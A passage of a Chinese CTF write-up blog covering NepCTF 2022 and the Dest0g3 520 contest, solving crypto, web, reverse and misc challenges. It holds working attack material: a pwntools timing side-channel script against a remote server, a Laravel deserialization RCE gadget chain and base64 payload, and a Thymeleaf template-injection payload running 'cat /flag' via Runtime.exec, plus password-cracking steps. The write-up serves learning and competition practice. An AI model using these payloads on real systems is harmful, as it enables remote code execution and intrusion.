int(self.ecc_table[&#x27;p&#x27;], base=16) if (T5 % 2) == 1: T4 = (T5 + ((T5 + int(self.ecc_table[&#x27;p&#x27;], base=16)) &gt;&gt; 1) - T3) % int( self.ecc_table[&#x27;p&#x27;], base=16) else: T4 = (T5 + (T5 &gt;&gt; 1) - T3) % int(self.ecc_table[&#x27;p&#x27;], base=16) T1 = (T1 * T4) % int(self.ecc_table[&#x27;p&#x27;], base=16) y3 = (T1 - T2) % int(self.ecc_table[&#x27;p&#x27;], base=16) form = &#x27;%%0%dx&#x27; % self.para_len form = form * 3 t2=clock1() if(t2-t1&lt;1e7): sleep(0.01-(((t2-t1))/1000000000.0)) return form % (x3, y3, z3) def _add_point(self, P1, P2): t1=clock1() if P1 == &#x27;0&#x27; * 128: return &#x27;%s%s&#x27; % (P2, &#x27;1&#x27;) if P2 == &#x27;0&#x27; * 128: return &#x27;%s%s&#x27; % (P1, &#x27;1&#x27;) len_2 = 2 * self.para_len l1 = len(P1) l2 = len(P2) if (l1 &lt; len_2) or (l2 &lt; len_2): return None else: X1 = int(P1[0:self.para_len], 16) Y1 = int(P1[self.para_len:len_2], 16) if l1 == len_2: Z1 = 1 else: Z1 = int(P1[len_2:], 16) x2 = int(P2[0:self.para_len], 16) y2 = int(P2[self.para_len:len_2], 16) T1 = (Z1 * Z1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T2 = (y2 * Z1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T3 = (x2 * T1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T1 = (T1 * T2) % int(self.ecc_table[&#x27;p&#x27;], base=16) T2 = (T3 - X1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T3 = (T3 + X1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T4 = (T2 * T2) % int(self.ecc_table[&#x27;p&#x27;], base=16) T1 = (T1 - Y1) % int(self.ecc_table[&#x27;p&#x27;], base=16) Z3 = (Z1 * T2) % int(self.ecc_table[&#x27;p&#x27;], base=16) T2 = (T2 * T4) % int(self.ecc_table[&#x27;p&#x27;], base=16) T3 = (T3 * T4) % int(self.ecc_table[&#x27;p&#x27;], base=16) T5 = (T1 * T1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T4 = (X1 * T4) % int(self.ecc_table[&#x27;p&#x27;], base=16) X3 = (T5 - T3) % int(self.ecc_table[&#x27;p&#x27;], base=16) T2 = (Y1 * T2) % int(self.ecc_table[&#x27;p&#x27;], base=16) T3 = (T4 - X3) % int(self.ecc_table[&#x27;p&#x27;], base=16) T1 = (T1 * T3) % int(self.ecc_table[&#x27;p&#x27;], base=16) Y3 = (T1 - T2) % int(self.ecc_table[&#x27;p&#x27;], base=16) form = &#x27;%%0%dx&#x27; % self.para_len form = form * 3 t2=clock1() if(t2-t1&lt;1e8): sleep(0.1-(((t2-t1))/1000000000.0)) return form % (X3, Y3, Z3) def _convert_jacb_to_nor(self, Point): len_2 = 2 * self.para_len x = int(Point[0:self.para_len], 16) y = int(Point[self.para_len:len_2], 16) z = int(Point[len_2:], 16) z_inv = pow( z, int(self.ecc_table[&#x27;p&#x27;], base=16) - 2, int(self.ecc_table[&#x27;p&#x27;], base=16)) z_invSquar = (z_inv * z_inv) % int(self.ecc_table[&#x27;p&#x27;], base=16) z_invQube = (z_invSquar * z_inv) % int(self.ecc_table[&#x27;p&#x27;], base=16) x_new = (x * z_invSquar) % int(self.ecc_table[&#x27;p&#x27;], base=16) y_new = (y * z_invQube) % int(self.ecc_table[&#x27;p&#x27;], base=16) z_new = (z * z_inv) % int(self.ecc_table[&#x27;p&#x27;], base=16) if z_new == 1: form = &#x27;%%0%dx&#x27; % self.para_len form = form * 2 return form % (x_new, y_new) else: return None def add_point(self,P1,P2): if P1==P2: return self._double_point(P1) else : return self._convert_jacb_to_nor(self._add_point(P1,P2))import sys,osfrom random import *import socketserverimport signalimport stringclass Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b&#x27;&#x27; while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) &lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): msg=msg.encode() try: if newline: msg += b&#x27;\\n&#x27; self.request.sendall(msg) except: pass def recv(self, prompt=b&#x27;[-] &#x27;): self.send(prompt, newline=False) return self._recvall() def handle(self): signal.alarm(3600) g=ecc_table[&quot;g&quot;] O=ecc_table[&quot;O&quot;] t=[randint(1,254) for i in range(8)] sk=sum([1&lt;&lt;i for i in t]) self.send(&quot;system reseting...&quot;) sm2 = TSM2(sk) self.send(&quot;done&quot;) self.send(&quot;the system is &quot;+str(sm2.pk)) for i in range(100): try: user=int(self.recv(&quot;plz give me your number:&quot;)) except: self.send(&quot;wrong, plz try again&quot;) continue t1=clock1() kG=sm2.kg(sk-user,g) t2=clock1() self.send(&quot;used &quot;+str((t2-t1)/1e9)+&quot; s&quot;) if kG==O: f=open(&quot;/flag&quot;) flag=f.read() self.send(flag) exit() class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): passclass ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): passif __name__ == &quot;__main__&quot;: HOST, PORT = &#x27;0.0.0.0&#x27;,8000 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True print(HOST, PORT) server.serve_forever() TSM2 类为正常SM2算法实现，只不过在加法运算 _add_point() 和倍乘运算 _double_point() 分别加了 sleep() 控制运算时间。 handle() 处理函数里，给出公钥 $pk$，给100次要求输入 $u$，当满足 $(sk-u)G=O$ 时可拿flag。 要满足 $(sk-u)G=O$，只有 $sk-u=0$ 或 $sk-u=n$，由于除了公钥和运算总时间无其他输出，只能猜测出 $u=sk$。 由于 $sk$ 只有8位为1，利用运算总时间，可作为侧信道信息来测试 $sk$ 各位为1时的消耗时间，测试发现当接近正确的“1”位时，运算总时间相较相邻的两位小，那么可使用时间侧信道攻击来求解私钥 $sk$。 因尝试的总次数最多为100次，采用区间遍历法缩小尝试次数，令 $x$ 为每个区间长度，总次数 $c=\\cfrac{254}{x}+8x \\le 100$，$x$ 可取值4~8。 采用 $x=4$ 实现： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *r=remote(&#x27;nep.lemonprefect.cn&#x27;,31135)r.recvuntil(&#x27;is &#x27;)pk=r.recvline().strip()print(pk)nowt = 100000.0start = []startt = []def send(x): r.recvuntil(&#x27;number:&#x27;) r.sendline(str(x)) r.recvuntil(&#x27;used &#x27;) time = float(r.recvuntil(&#x27; s&#x27;)[:-2]) r.recvline() return timefor i in range(1,255,4): t = send(1 &lt;&lt; i) print(i,t) if t &gt; nowt: start.append(i-4) print(start) nowt = t print(start)ans = []for k in start: nowt = send(1 &lt;&lt; k) for j in range(4): t = send(1 &lt;&lt; (k+1+j)) if t &gt; nowt and k+1+j-1 &lt;= 254: ans.append(k+1+j-1) print(ans) nowt = t print(ans)sk = sum([1&lt;&lt;i for i in ans])print(sk)send(sk)print(r.recvall()) ​ WEBJust Kidding 顽皮的HRP用Laravel写了个项目来欢迎大伙来玩Nepctf 2nd，没想到…居然被坏蛋Sharun撅了 访问 www.zip 下载源码，CMS为Laravel 9.x。 在 www\\app\\Http\\Controllers 发现 HelloController.php： 1234567891011&lt;?phpnamespace App\\Http\\Controllers;class HelloController extends Controller&#123; public function hello(\\Illuminate\\Http\\Request $request)&#123; $h3 = base64_decode($request-&gt;input(&quot;h3&quot;)); unserialize($h3); return &quot;Welcome Nepctf! GL&amp;HF&quot;; &#125;&#125; 反序列化RCE漏洞，使用现成链子可以打通： 12345678910111213141516171819202122232425&lt;?phpnamespace Illuminate\\Routing&#123; use Illuminate\\Validation\\Validator; class PendingResourceRegistration &#123; protected $registrar; protected $registered = false; protected $name=&#x27;call_user_func&#x27;; protected $controller=&#x27;system&#x27;; protected $options; public function __construct($cmd)&#123; $this-&gt;registrar=new Validator(); $this-&gt;options=$cmd; &#125; &#125; echo base64_encode(serialize(new PendingResourceRegistration(&#x27;cat /flag&#x27;)));&#125;namespace Illuminate\\Validation&#123; class Validator&#123; public $extensions = []; public function __construct()&#123; $this-&gt;extensions[&#x27;&#x27;]=&#x27;call_user_func&#x27;; &#125; &#125;&#125; Payload： /hello?h3=Tzo0NjoiSWxsdW1pbmF0ZVxSb3V0aW5nXFBlbmRpbmdSZXNvdXJjZVJlZ2lzdHJhdGlvbiI6NTp7czoxMjoiACoAcmVnaXN0cmFyIjtPOjMxOiJJbGx1bWluYXRlXFZhbGlkYXRpb25cVmFsaWRhdG9yIjoxOntzOjEwOiJleHRlbnNpb25zIjthOjE6e3M6MDoiIjtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7fX1zOjEzOiIAKgByZWdpc3RlcmVkIjtiOjA7czo3OiIAKgBuYW1lIjtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7czoxMzoiACoAY29udHJvbGxlciI7czo2OiJzeXN0ZW0iO3M6MTA6IgAqAG9wdGlvbnMiO3M6OToiY2F0IC9mbGFnIjt9 ​ Challenger 顽皮的HRP又换了种语言写项目来欢迎大家，没想到又让Sharun掘了😭 （flag在根目录下: /flag） 用jd-gui反编译 challenger.jar 文件，发现使用了Thymeleaf模板， 在 HelloController.class 里发现 /eval 路由： 1234567891011121314@Controllerpublic class HelloController&#123; Logger log = LoggerFactory.getLogger(com.veracode.research.HelloController.class); @GetMapping(&#123;&quot;/&quot;&#125;) public String index(Model model) &#123; model.addAttribute(&quot;message&quot;, &quot;challenger&quot;); return &quot;welcome&quot;; &#125; @GetMapping(&#123;&quot;/eval&quot;&#125;) public String path(@RequestParam String lang) &#123; return &quot;user/&quot; + lang + &quot;/welcome&quot;; &#125;&#125; 参考 Thymeleaf 模板注入导致命令执行，修改payload拿到flag： Payload: /eval?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20/flag%22).getInputStream()).next()%7d__:: ​ REVERSE快来签到 x86 linux 趣味题。 IDA打开发现报错 The graph is too big more than 1000 nodes...，且 main() 函数中定义多个图节点，到 IDA - Options - Graph - Max number of nodes 里改一个大数保存，回到 main() 函数切换成Graph overview或者IDA View中缩小，可以看到控制流图（CFG）： flag：NepCTF&#123;welc0me_t0_nepctf&#125; ​ We_can_gone 是出发的时候了!!! Go逆向，IDA7.7分析，在String窗口里找到关键字符串交叉引用定位入口函数 sub_4994E0()： 123456789101112131415161718192021222324252627282930313233__int128 sub_4994E0()&#123; _BYTE *v0; // [esp+0h] [ebp-18h] int v1; // [esp+0h] [ebp-18h] unsigned int v2; // [esp+4h] [ebp-14h] int v3; // [esp+4h] [ebp-14h] int v4; // [esp+8h] [ebp-10h] unsigned int v5; // [esp+Ch] [ebp-Ch] _BYTE *v6; // [esp+14h] [ebp-4h] __int128 result; // [esp+1Ch] [ebp+4h] sub_4993B0(); // 输出字符串&quot;Welcome to NepCTF,I gone on the other side&quot; v6 = v0; v5 = v2; sub_433950(); runtime_printstring(&quot;please input flag to help you get to the other side:\\n&quot;, 53); sub_4339C0(); if ( v5 &lt;= 0xB ) sub_459750(v1, v3); v6[11] = 84; if ( v5 &lt;= 0xC ) sub_459750(v1, v3); v6[12] = 82; if ( v5 &lt;= 0xD ) sub_459750(v1, v3); v6[13] = 85; if ( v5 &lt;= 0xE ) sub_459750(v1, v3); v6[14] = 69; // 定义字符串TRUE *(_QWORD *)&amp;result = __PAIR64__(v5, (unsigned int)v6); // 伪代码混乱 DWORD2(result) = v4; return result;&#125; 后半部分伪代码不清晰，在该函数附近发现判断逻辑函数 sub_499630() ： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758void sub_499630()&#123; int i; // edx int v1; // [esp+0h] [ebp-64h] int *v2; // [esp+4h] [ebp-60h] int v3; // [esp+4h] [ebp-60h] _BYTE *v4; // [esp+Ch] [ebp-58h] int v5; // [esp+10h] [ebp-54h] int v6[8]; // [esp+20h] [ebp-44h] BYREF int *v7; // [esp+40h] [ebp-24h] int v8[2]; // [esp+44h] [ebp-20h] BYREF int v9[2]; // [esp+4Ch] [ebp-18h] BYREF int v10[2]; // [esp+54h] [ebp-10h] BYREF int v11[2]; // [esp+5Ch] [ebp-8h] BYREF v2 = (int *)unknown_libname_8((int)&quot;\\b&quot;); v7 = v2; v2[1] = 0; *v2 = 0; v11[0] = (int)&amp;unk_4A00A0; v11[1] = (int)v2; fmt_Fscanln((int)&amp;off_4D25B8, dword_54B200, (int)v11, 1, 1); v4 = (_BYTE *)sub_4479B0((int)v6, *v7, v7[1]); if ( v5 == 23 //输入字符串长度满足23 &amp;&amp; *v4 == &#x27;N&#x27; &amp;&amp; v4[1] == &#x27;e&#x27; &amp;&amp; v4[2] == &#x27;p&#x27; &amp;&amp; v4[3] == &#x27;C&#x27; &amp;&amp; v4[4] == &#x27;T&#x27; &amp;&amp; v4[5] == &#x27;F&#x27; &amp;&amp; v4[6] == &#x27;&#123;&#x27; &amp;&amp; v4[22] == &#x27;&#125;&#x27; ) //输入字符串满足前缀NepCTF&#123;，后缀满足&#125; &#123; for ( i = 0; i &lt; 15; ++i ) &#123; if ( i &gt;= (unsigned int)dword_54B6E4 ) sub_459750(v1, v3); if ( (unsigned int)(i + 7) &gt;= 0x17 ) sub_459750(v1, v3); if ( v4[i + 7] != *(_BYTE *)(dword_54B6E0 + i) ) //将输入和dword_54B6E0比较 &#123; v9[0] = (int)&quot;\\b&quot;; v9[1] = (int)&amp;off_4D2334; unknown_libname_61((int)&amp;off_4D25CC, dword_54B204, (int)v9, 1, 1); return; &#125; &#125; v8[0] = (int)&quot;\\b&quot;; v8[1] = (int)&amp;off_4D233C; unknown_libname_61((int)&amp;off_4D25CC, dword_54B204, (int)v8, 1, 1); &#125; else &#123; v10[0] = (int)&quot;\\b&quot;; v10[1] = (int)&amp;off_4D2334; unknown_libname_61((int)&amp;off_4D25CC, dword_54B204, (int)v10, 1, 1); &#125;&#125; 在 v4[i + 7] != *(_BYTE *)(dword_54B6E0 + i) 比较处下断点动调，查看 dword_54B6E0 存放的值为 U9eT_t0_th3TRUE，故flag为NepCTF&#123;U9eT_t0_th3TRUE&#125;。 ​ PWN菜。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022赛","slug":"2022赛","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"Dest0g3 520迎新赛","slug":"match-Dest0g3-520迎新赛","date":"2022-05-26T12:09:18.000Z","updated":"2022-05-28T14:17:41.878Z","comments":true,"path":"2022/05/26/match-Dest0g3-520迎新赛/","link":"","permalink":"https://lazzzaro.github.io/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/","excerpt":"","text":"​ 首届Dest0g3 520迎新赛更加注重CTFer的基础知识面掌握程度，由易到难，适合各学习阶段选手参加，纯萌新水准。 比赛时间：2022.5.20 10:00 - 5.27 10:00 题目分类：Web、Pwn、Misc、Crypto、Re、AI、BlockChain 题目难度：萌新 比赛类型：个人赛 比赛交流QQ群：923945203 个人赛奖励：总榜前10及各方向前三均可获得《从0到1：CTFer成长之路》一本 + 定制U盘（32G）一个 Rank: 12 MISCWelcome to fxxking 关注公众号并回复：Give me the fxxking flag 公众号 Dest0g3 Team 回复：Give me the fxxking flag， 得到 The fxxking flag is: Dest0g3&#123;W31c0m3_t0_DestCTF2022!&#125; ​ Pngeniusforemost分解png图片得到zip压缩包，zsteg查看png图片的lsb通道得到 Password for zip:Weak_Pas5w0rd； 用密码 Weak_Pas5w0rd 解压zip压缩包得到flag：Dest0g3&#123;2908C1AA-B2C1-B8E6-89D1-21B97D778603&#125;。 ​ EasyEncode Enjoy Decoding 用ARCHPR爆破zip压缩包密码得到 100861，按照 摩斯密码-16进制-Unicode-Base64 解码得到 Dest0g3&#123;Deoding_1s_e4sy_4_U&#125;。 ​ 你知道js吗打开flag文件发现是word文件/压缩包，在 document.xml 中找到Base64编码的字符串，解码得到brainfuck，在线解密得到16进制字符串 446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D，转为字符得 Dest0g3&#123;86facac9-0a5d-4047-b702-86cb37ab77b2&#125;。 ​ StrangeTrafficWireshark打开发现是Modbus流量，在流0发现分段Base64字符串 RGVzdDBnM3、szMUE1QkVB、Ni1GMjBELU、YxOEEtRThF、QS0yOUI0Rj、I1NzEwOEJ9，连接解码得 Dest0g3&#123;31A5BEA6-F20D-F18A-E8EA-29B4F257108B&#125;。 ​ EasyWord Let the word tell u 根据 hint.txt 得知 password.docm 密码全小写字母，且满足 ??q?b?，用john爆破： 12office2john password.docm &gt; hash.txtjohn --mask=&#x27;?l?lq?lb?l&#x27; hash.txt 得到密码 ulqsbt； 打开发现存在宏，查看宏代码有密码，参考类似题目中破解宏密码的方法，将word文件用压缩包方式打开，找到 vbaProject.bin 文件以16进制方式查看，将 DBP 改为 DBX 并保存，再将修改后的文件替换到压缩包里，改回word文件格式，重新打开可看到宏代码。 进入VBA编辑器查看Dialog对应宏代码： 123456789101112131415161718192021222324252627282930313233343536Private Sub CB_OK_Click()Dim strpasw As StringDim strdec As StringDim strusrinput As StringDim t As Stringt = ChrW(21152) &amp; ChrW(27833) &amp; ChrW(21543) &amp; ChrW(65292) &amp; ChrW(21516) &amp; ChrW(23398) &amp; ChrW(20204) &amp; ChrW(65281)strusrinput = Dialog.TextBox_PaswDim sinput As Stringsinput = strusrinputIf (strusrinput &lt;&gt; &quot;&quot;) Then strusout = Encode(strusrinput, t) If (strusout = &quot;┤℡ǒqｘ~&quot;) Then strdec = Decode(Dialog.Label_ls.Caption, sinput) Else If (strusout = &quot;ｋGJEｇｑ&quot;) Then strdec = Decode(Dialog.Label_ls1.Caption, sinput) Else If (strusout = &quot;ЮΟopz+&quot;) Then strdec = Decode(Dialog.Label_ls2.Caption, sinput) Else If (strusout = &quot;ｚΚjrШφεあ&quot;) Then strdec = Decode(Dialog.Label_ls4.Caption, sinput) Else If (strusout = &quot;àǖtＵｗ┧ｈè&quot;) Then strdec = Decode(Dialog.Label_ls3.Caption, sinput) Else strdec = StrConv(t, vbFromUnicode) End If End If End If End If End If Label_CLUE.Caption = strdecEnd If 无需分析加解密算法，输出结果 strusout 由 Encode(strusrinput, t) 加密得到，只需分别用解密函数反推五个if分支条件对应的明文即可，修改 Label_CLUE.Caption = strdec 为 Label_CLUE.Caption = Decode(xxx,t)，回到word运行 AutoOpen 宏，随便输入字符点击确定即可在Dialog的label处显示对应明文，分别是 123456、aaaaaa、000000、墙角数枝、iloveyou； 将 Label_CLUE.Caption = Decode(xxx,t) 改回 Label_CLUE.Caption = strdec，分别输入五段明文，发现输入 墙角数枝 得到 解压密码：两只黄鹂鸣翠柳,一行白鹭上青天!，结合word里的hint Rar密码为复杂型，长度为16位，包含了字母、数字和符号。，压缩包密码猜出为 2zhlmcl,1hblsqt.，解压拿到flag：Dest0g3&#123;VBScr1pt_And_Hashc4t_1s_g00d&#125;。 ​ 4096 Just relax and always be aware of the changes on the web! 4096小游戏，查看js，用chrome源代码里的搜索功能，搜 flag 可在 local_storage_manager.js 里找到 12345function getPartFlag(score) &#123; if (score &gt; 10000) &#123; console.log(&quot;Q29uZ3JhdHVsYXRpb25zLCB0aGlzIGlzIHBhcnQgb2YgdGhlIGZsYWc6IE5HVmxOeTFpTmpjekxUazNNV1E0TVdZNFlqRTNOMzA9Lg==&quot;); &#125;&#125; 两次base64解码得到flag后半部分 4ee7-b673-971d81f8b177&#125;。 前半部分在js内找很久都没找到，观察资源文件里存在 favicon.ico 和 favicon.png 两张图，取出来发现png图有隐写，foremost分出一个wav文件和一个zip文件； 用audacity查看wav，前后两段是DTMF按键音，解码出 74958097831，中间一段是SSTV慢扫描电视，用robot36扫出图片，内容是 MD5&#123;cell phone number&#125;，将前面的 74958097831 倒序成手机号格式，MD5加密得到 32fc1b5487cb447f792a19418b92544e，解压zip压缩包； 压缩包里为切割后打乱拼接的图片，利用gaps工具拼图 gaps --image=puzzle.png --size=64 --save 得到的结果还是有部分块位置不对，再gaps两次得到完整原图： 将字符串拼接得 RGVzdDBnM3tlZDRkMTE0Zi05ZWU0LQ==，base64解码得flag前半段：Dest0g3&#123;ed4d114f-9ee4-。 ​ Python_jail 听说python是最好的语言，那我把它锁起来，我就是最好的语言了！ 根据hint提示，password里内容是whitespace语言，在线编译得到 a8e15220-7404-4269-812e-6418557b7dc2，是zip压缩包密码； 解压zip压缩包，zsteg发现lsb隐写pyc文件，提取： zsteg -E &quot;b1,rgb,lsb,xy&quot; SECRET1.png &gt; out.pyc 无需反编译，16进制查看发现 ZmxhZ3tiNWJjZmM4Ny01Y2E2LTQzZjEtYjM4NC01N2QwOWI4ODZjYTl9，base64解码得 flag&#123;b5bcfc87-5ca6-43f1-b384-57d09b886ca9&#125;。 ​ codegame Funny and ez codegame with Key to celebrate EDG KEYcode里经查是LOLCODE Language，用dcode解得到输出是 QEFPFPQEBMXPPTLOA，以此为密码解压zip压缩包，得到word文件； 直接打开word发现 AES 提示，用压缩包打开word有个 fllllllllll1ag.txt 文件，里面是一串emoji表情，猜想为emoji-aes加密，在线解密，同样用 QEFPFPQEBMXPPTLOA 作为key，没成功，再不断盲调Rotation，在Rotation为4的时候解密成功，得到 666C61677B39663638663333342D303137612D343230312D393264662D6464646363313435333334647D 16进制转字符串得 flag&#123;9f68f334-017a-4201-92df-dddcc145334d&#125;。 ​ rookie hacker-2 （容器1的容器名为 test_docker1，容器2的容器名为 test_docker2） Alice访问自己的docker时忘记了把容器分别部署在哪些ip上，你能帮帮他么？ Flag格式：Dest0g3{ip1_ip2_…..} 例：假设容器1、容器2的ip为1.1.1.1、2.2.2.2，则flag为 Dest0g3{1.1.1.1_2.2.2.2} 非预期，docker的IP地址会以 &quot;IPAddress&quot;: &quot;172.x.x.x&quot; 的形式记录在配置文件中，直接在E01文件里用正则表达式 &quot;IPAddress&quot;:&quot;172 搜索，取出现频率最高的两个IP即可，flag：Dest0g3&#123;172.18.0.2_172.18.0.3&#125;。 ​ CRYPTObabyRSA 123456789101112131415from Crypto.Util.number import bytes_to_long, getPrimefrom gmpy2 import next_primep = getPrime(1024)q = next_prime(p)n = p*qflag = open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;).read()m = bytes_to_long(flag)e = 65537c = pow(m, e, n)print(n)print(c)&#x27;&#x27;&#x27;2727241093749761542918401733543736746628898149858580339856145630001944770200140316588520093651017398038048982882852398338873002610186588452067987267156953210170846934456215571897422219668454400307176562513448963233141401155553613028910682273254490450242872713349823916132462569827038171564033211138146581362190846531107667833769581912417863873701584094122334217656345818191886564170128296545570579045665843164163247078768938971464352896803751926514491946540256195901479832490801094763283428169863884868363211362378830392193990816845049219767176116700985531282036442764829649457179429810554375814106591525767430508126714181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854&#x27;&#x27;&#x27; $p,q$ 相近，常规RSA： 1234567891011121314from gmpy2 import *n = e = c = p = iroot(n,2)[0]while not is_prime(p): p += 1q = n // pd = invert(e, (p-1)*(q-1))m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;Dest0g3&#123;96411aad-032c-20a8-bc43-b473f6f08536&#125;&#x27; ​ babyAES 1234567891011121314151617from Crypto.Cipher import AESimport osiv = os.urandom(16)key = os.urandom(16)my_aes = AES.new(key, AES.MODE_CBC, iv)flag = open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;).read()flag += (16 - len(flag) % 16) * b&#x27;\\x00&#x27;c = my_aes.encrypt(flag)print(c)print(iv)print(key)&#x27;&#x27;&#x27;b&#x27;C4:\\x86Q$\\xb0\\xd1\\x1b\\xa9L\\x00\\xad\\xa3\\xff\\x96 hJ\\x1b~\\x1c\\xd1y\\x87A\\xfe0\\xe2\\xfb\\xc7\\xb7\\x7f^\\xc8\\x9aP\\xdaX\\xc6\\xdf\\x17l=K\\x95\\xd07&#x27;b&#x27;\\xd1\\xdf\\x8f)\\x08w\\xde\\xf9yX%\\xca[\\xcb\\x18\\x80&#x27;b&#x27;\\xa4\\xa6M\\xab&#123;\\xf6\\x97\\x94&gt;hK\\x9bBe]F&#x27;&#x27;&#x27;&#x27; AES-CBC解密： 12345678910from Crypto.Cipher import AESc = b&#x27;C4:\\x86Q$\\xb0\\xd1\\x1b\\xa9L\\x00\\xad\\xa3\\xff\\x96 hJ\\x1b~\\x1c\\xd1y\\x87A\\xfe0\\xe2\\xfb\\xc7\\xb7\\x7f^\\xc8\\x9aP\\xdaX\\xc6\\xdf\\x17l=K\\x95\\xd07&#x27;iv = b&#x27;\\xd1\\xdf\\x8f)\\x08w\\xde\\xf9yX%\\xca[\\xcb\\x18\\x80&#x27;key = b&#x27;\\xa4\\xa6M\\xab&#123;\\xf6\\x97\\x94&gt;hK\\x9bBe]F&#x27;my_aes = AES.new(key, AES.MODE_CBC, iv)m = my_aes.decrypt(c)print(m)# b&#x27;Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;\\x00\\x00\\x00&#x27; ​ ezDLP 1234567891011from Crypto.Util.number import *flag = open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;).read()x = bytes_to_long(flag)g = 19p = 335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353h = pow(g, x, p)print(h)&#x27;&#x27;&#x27;199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162&#x27;&#x27;&#x27; DLP求解： 12345678# Sageg = 19p = h = x = discrete_log(mod(h,p),mod(g,p))print(bytes.fromhex(hex(x)[2:]))# b&#x27;Dest0g3&#123;07ed2a6f-182f-a05d-c81e-1318af820a78&#125;&#x27; ​ ezStream 1234567891011121314151617181920212223242526272829303132333435363738from Crypto.Util.number import *f = open(&#x27;flag.txt&#x27;, &#x27;r&#x27;)flag = f.read()f.close()assert flag[:8] == &quot;Dest0g3&#123;&quot;class LCG: def __init__(self): self.a = getRandomNBitInteger(32) self.b = getRandomNBitInteger(32) self.m = getPrime(32) self.seed = getRandomNBitInteger(32) def next(self): self.seed = (self.a * self.seed + self.b) % self.m return self.seed &gt;&gt; 16 def output(self): print(&quot;a = &#123;&#125;\\nb = &#123;&#125;\\nm = &#123;&#125;&quot;.format(self.a, self.b, self.m)) print(&quot;state1 = &#123;&#125;&quot;.format(self.next())) print(&quot;state2 = &#123;&#125;&quot;.format(self.next()))lcg = LCG()lcg.output()c = b&#x27;&#x27;.join([long_to_bytes(ord(flag[i]) ^ (lcg.next() % 10)) for i in range(len(flag))])print(bytes_to_long(c))&#x27;&#x27;&#x27;a = 3939333498b = 3662432446m = 2271373817state1 = 17362state2 = 20624600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878&#x27;&#x27;&#x27; LCG，爆破求seed： 123456789101112131415161718a = 3939333498b = 3662432446m = 2271373817state1 = 17362state2 = 20624c = 600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878c = list(bytes.fromhex(hex(c)[2:]))for i in range(65536): s1 = (state1&lt;&lt;16)+i s2 = (a*s1+b) % m if s2&gt;&gt;16 == state2: seed = ((s1-b)*inverse_mod(a,m))%m print(seed) # 1315807869# 710396196# 104984523 三个结果分别代入求解： 123456789101112131415161718192021222324252627c = 600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878c = list(bytes.fromhex(hex(c)[2:]))seed = [1315807869,710396196,104984523]for k in seed: class LCG: def __init__(self): self.a = 3939333498 self.b = 3662432446 self.m = 2271373817 self.seed = k def next(self): self.seed = (self.a * self.seed + self.b) % self.m return self.seed &gt;&gt; 16 lcg = LCG() lcg.next() lcg.next() flag = &#x27;&#x27; for i in range(len(c)): flag += chr(c[i] ^^ (lcg.next() % 10)) print(flag) # Bcpp7`;&#123;e84m559&gt;$l52o(e89: g5bl-kfg376077b26|# Iosr2f;b02g6883(c59a%`5=6&quot;`4oi-ga`645;3&lt;d26&#125;# Dest0g3&#123;f21c7180-c35e-f912-e4bc-bfd235759a25&#125; ​ Mr.Doctor 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from Crypto.Util.number import *from hashlib import sha256import stringtable = string.ascii_letters + string.digitsflag = open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;).read()[8:-1]seed = getRandomNBitInteger(40)class SHA256: def __init__(self): self.proof = [] self.sha = 0 